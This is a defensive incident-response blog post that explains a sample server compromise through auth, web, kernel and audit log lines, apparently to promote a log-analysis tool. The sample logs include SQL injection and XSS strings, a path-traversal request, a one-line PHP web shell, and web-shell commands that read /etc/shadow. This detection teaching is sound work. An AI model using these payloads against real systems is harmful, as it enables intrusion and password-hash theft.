# 🪓 Log Analysis in Incident Response — What Defenders Miss

*March 7, 2026 • bad-antics • #dfir #blue-team #logreaper #incident-response*

---

## The 3 AM Page

You know the feeling. Your phone lights up. PagerDuty. The SOC analyst's message is terse: *"Suspicious activity on the webserver. SSH brute force followed by web shells. Need IR lead."*

You grab your laptop and start pulling logs. Auth logs, Apache access logs, kernel messages, audit trails. Thousands of lines across multiple sources. Somewhere in that haystack are the precise sequence of events that tell you exactly what happened, when, and how far the attacker got.

But here's the thing most defenders get wrong: **they look for individual indicators instead of attack chains.**

Today I want to walk through a realistic attack scenario — the kind I built [LogReaper](https://github.com/bad-antics/nullsec-logreaper) to detect — and show you the patterns that most log analysis tools (and analysts) miss.

---

## Anatomy of a Real Attack (In 15 Minutes)

Let's walk through an actual attack timeline. I built a sample scenario that captures the most common patterns I see in real-world IR engagements. Every line here maps to something I've encountered in production.

### Phase 1: Reconnaissance & Brute Force (02:15:22 - 02:15:33)

```
sshd[9102]: Failed password for root from 203.0.113.42 port 44312 ssh2
sshd[9102]: Failed password for root from 203.0.113.42 port 44312 ssh2
sshd[9102]: Failed password for root from 203.0.113.42 port 44312 ssh2
sshd[9103]: Failed password for invalid user admin from 203.0.113.42 port 44580 ssh2
sshd[9104]: Failed password for invalid user test from 203.0.113.42 port 44821 ssh2
```

**What most tools catch:** "SSH brute force detected." ✅

**What most tools miss:**
- The port increments (44312 → 44580 → 44821) indicate automated tooling, not manual attempts
- The PID changes (9102 → 9103 → 9104) show parallel connections — the attacker is running threads
- The username rotation (root → admin → test) follows a dictionary pattern, likely Hydra or Medusa
- Same source port range suggests the attacker is behind NAT or using a single proxy

### Phase 2: Initial Access (02:15:45)

```
sshd[9105]: Accepted password for www-data from 203.0.113.42 port 45001 ssh2
```

**What most tools catch:** "Successful SSH login." Sometimes flagged. ✅

**What most tools miss:**
- `www-data` is a **service account** — it should never have an interactive SSH session
- The login came from the **same IP** that was just brute-forcing — this isn't a coincidence, it's a compromise
- The port jumped from 44821 to 45001 — the attacker paused, possibly checked results, then reconnected
- `www-data` with password auth? This account probably has a weak or default password, suggesting misconfiguration

**This is where the attack shifts from "attempt" to "success," and it's the most critical log line in the entire incident.** Many SIEMs won't correlate the brute force with this success because they treat SSH events as individual alerts.

### Phase 3: Privilege Escalation (02:15:47 - 02:15:48)

```
sudo: www-data : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
su[9201]: pam_unix(su:session): session opened for user root by www-data(uid=33)
```

**What most tools catch:** "Sudo usage detected." ✅

**What most tools miss:**
- `www-data` in sudoers? This is a **critical misconfiguration** — web service accounts should never have sudo
- `PWD=/tmp` — working from /tmp is a massive red flag; legitimate admins work in project directories
- The command is `/bin/bash` — not a specific administrative task, but a full root shell
- Time delta of **2 seconds** from SSH login to root shell — this is automated, not manual exploration
- The combination of `su` + `sudo` in rapid succession suggests the attacker ran `sudo su -` or `sudo bash`

### Phase 4: Network Probing & Simultaneous Attack (02:16:01 - 02:16:26)

```
kernel: TCP: Possible SYN flooding on port 443. Sending cookies.
kernel: Firewall: DROP IN=eth0 SRC=198.51.100.23 DST=10.0.1.20 PROTO=TCP DPT=22
kernel: Firewall: DROP IN=eth0 SRC=198.51.100.23 DST=10.0.1.20 PROTO=TCP DPT=23
kernel: Firewall: DROP IN=eth0 SRC=198.51.100.23 DST=10.0.1.20 PROTO=TCP DPT=80
kernel: Firewall: DROP IN=eth0 SRC=198.51.100.23 DST=10.0.1.20 PROTO=TCP DPT=443
kernel: Firewall: DROP IN=eth0 SRC=198.51.100.23 DST=10.0.1.20 PROTO=TCP DPT=3306
kernel: Firewall: DROP IN=eth0 SRC=198.51.100.23 DST=10.0.1.20 PROTO=TCP DPT=8080
```

**What most tools catch:** "Port scan detected." "SYN flood detected." ✅

**What most tools miss:**
- **Different source IP** (198.51.100.23 vs 203.0.113.42) — is this a second attacker, or the same actor using a different proxy?
- The port scan targets (22, 23, 80, 443, 3306, 8080) are **service-specific**, not a full sweep — this is targeted reconnaissance
- Port 3306 (MySQL) suggests the attacker knows this is a web server and is looking for the database
- The SYN flood on 443 could be a **distraction** — generating noise while the real attacker (on .42) is already inside with root
- The timing overlap with Phase 3 is suspicious — coordinated attack?

### Phase 5: Web Application Exploitation (02:17:01 - 02:17:22)

```
"GET /admin/login.php HTTP/1.1" 200 4521
"POST /admin/login.php HTTP/1.1" 302 0
"GET /admin/../../../etc/passwd HTTP/1.1" 400 299
"GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 8192
"GET /products?id=1'+OR+1=1--+ HTTP/1.1" 200 15823
"GET /products?id=1+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 200 982
"POST /upload.php HTTP/1.1" 200 48 "<?php system($_GET['cmd']); ?>"
"GET /uploads/shell.php?cmd=id HTTP/1.1" 200 32
"GET /uploads/shell.php?cmd=cat+/etc/shadow HTTP/1.1" 200 1520
```

**What most tools catch:** "SQL injection detected." "XSS detected." "Web shell detected." ✅

**What most tools miss:**
- The attacker **already has root SSH access** from Phase 3. Why are they exploiting the web app? Two possibilities:
  1. **Establishing persistence** through a second channel (web shell as backup access)
  2. **Different attacker** following the same initial access vector
- The 302 redirect on login means they **successfully authenticated** to the admin panel — with what credentials?
- The LFI attempt (`../../../etc/passwd`) returned 400, so the app has *some* protection, but not enough
- The UNION SELECT returned response size 982 bytes — **much smaller** than the normal 15823 — this is the database contents, not the product page
- The web shell upload (`<?php system($_GET['cmd']); ?>`) with response size 48 means the upload succeeded
- `cmd=cat+/etc/shadow` with 1520 bytes response — they now have password hashes for **every user on the system**
- **Key insight:** The response sizes tell the story. 200 status doesn't mean "blocked" — it means the attack *worked*.

### Phase 6: Persistence & C2 (02:17:30 - 02:17:40)

```
kernel: audit: operation="exec" pid=9312 comm="bash" name="/dev/shm/.x" requested_mask="x"
crontab[9315]: (www-data) REPLACE (www-data) crontab entry modified
kernel: process 9320 (kworker/u:0) attempted to connect to 192.0.2.99:4444
sshd[9325]: reverse mapping checking getaddrinfo for 42-113-0-203.dynamic.example.com failed
named[1201]: client 203.0.113.42#53491: query (cache) 'evil.c2server.xyz/A/IN' denied
```

This is where it gets serious.

**What most tools catch:** "Outbound connection to suspicious IP." Maybe. ✅

**What most tools miss:**
- `/dev/shm/.x` — executing from shared memory with a hidden filename (dot-prefix). This is **in-memory malware**. It won't survive a reboot but evades disk-based scanning
- The process masquerades as `kworker/u:0` — a legitimate kernel worker thread name. `ps aux` won't flag it
- Port 4444 is the default Metasploit handler port — this is likely a Meterpreter reverse shell
- The crontab modification ensures **persistence** — even if the SSH session dies, the malware relaunches
- The DNS query for `evil.c2server.xyz` confirms C2 communication — but the DNS server **denied** it, meaning DNS filtering is working (small win)
- Reverse DNS failure on the attacker IP reveals their ISP (`dynamic.example.com`) — useful for threat intel

### Phase 7: Impact (02:17:45 - 02:17:50)

```
kernel: Out of memory: Kill process 3122 (mysqld) score 901 or sacrifice child
postfix/smtpd[9401]: NOQUEUE: reject: RCPT from unknown[203.0.113.42]: 554 Relay access denied
```

**What most tools catch:** "OOM killer triggered." ✅

**What most tools miss:**
- MySQL OOM with score 901 (out of 1000) means the database was consuming **90% of system memory**. Was this the attacker's doing (resource exhaustion / crypto mining) or a side effect of the attack?
- The SMTP relay attempt means the attacker tried to **use the server as a spam relay** — this indicates a less sophisticated attacker or an automated botnet script
- The relay was denied — postfix is configured correctly. But the attempt tells you the attacker's intent

---

## The Patterns Most Tools Miss

After building LogReaper and analyzing hundreds of incidents, I've identified the gaps in conventional log analysis:

### 1. Cross-Source Correlation

Most SIEM rules trigger on single log sources. The SSH brute force → SSH success → sudo escalation → web shell chain spans **four different log sources** (auth.log, syslog, access.log, audit.log). Without correlation, each event looks routine.

### 2. Response Size Analysis

Web application firewalls and log analyzers focus on request patterns. But **response sizes** are often more telling:
- Normal product page: 15,823 bytes
- SQL injection result: 982 bytes
- Web shell command output: 32 bytes

The delta tells you whether an attack succeeded, not just whether it was attempted.

### 3. Temporal Clustering

The entire attack took **15 minutes**. Human analysts reviewing logs hours or days later often miss the time compression. When you see 7 distinct attack phases in 15 minutes, that's automation — and automation means the attacker has done this before.

### 4. Service Account Abuse

`www-data` logging in via SSH with sudo access is a configuration audit failure that became an attack vector. Log analysis tools should flag service account interactive sessions as **critical**, not informational.

### 5. Process Masquerading

`kworker/u:0` is a legitimate kernel thread name. Attackers name their implants after system processes. Detection requires baseline comparison — what kernel threads were running *before* the incident?

---

## What LogReaper Does Differently

This is exactly why I built [LogReaper](https://github.com/bad-antics/nullsec-logreaper). The core philosophy:

1. **Multi-source ingestion** — Feed it auth logs, web logs, kernel messages, and audit trails simultaneously
2. **Attack chain reconstruction** — Don't just alert on individual events; reconstruct the full kill chain
3. **Response analysis** — Parse HTTP response sizes and codes to determine if attacks *succeeded*
4. **Temporal correlation** — Group events by time windows and source IP to identify coordinated activity
5. **500+ detection patterns** — Including process masquerading, in-memory execution, and service account abuse

```bash
# Analyze the sample attack scenario
./logreaper -A demo/sample-attack.log -v

# Extract IOCs for SIEM integration
./logreaper -A demo/sample-attack.log --ioc --format json

# Generate timeline visualization
./logreaper -A demo/sample-attack.log --timeline --format html
```

---

## Takeaways for Defenders

1. **Service accounts should never have interactive SSH or sudo access.** Audit this quarterly.
2. **Correlate across log sources.** Single-source alerting misses kill chains.
3. **Monitor response sizes,** not just request patterns. A 200 OK can mean "attack succeeded."
4. **Track time deltas.** 2 seconds from login to root shell = automation = experienced attacker.
5. **Baseline your processes.** If you don't know what `kworker` threads normally exist, you can't detect masquerading.
6. **DNS filtering works.** The C2 query was denied. Layer your defenses.

---

## Tomorrow

I'm going to dig into **cloud log analysis** — specifically, what CloudTrail events most teams ignore and how attackers exploit assumed-role trust chains in AWS. That's where LogReaper's cloud module shines.

---

*All scenarios are for authorized security testing and educational purposes only.*

**Tags:** `dfir` `incident-response` `log-analysis` `blue-team` `logreaper` `attack-chain`

---

← [Blog Index](Blog-Index) • [Flipper Zero Deep Dive →](Flipper-Zero-Deep-Dive)
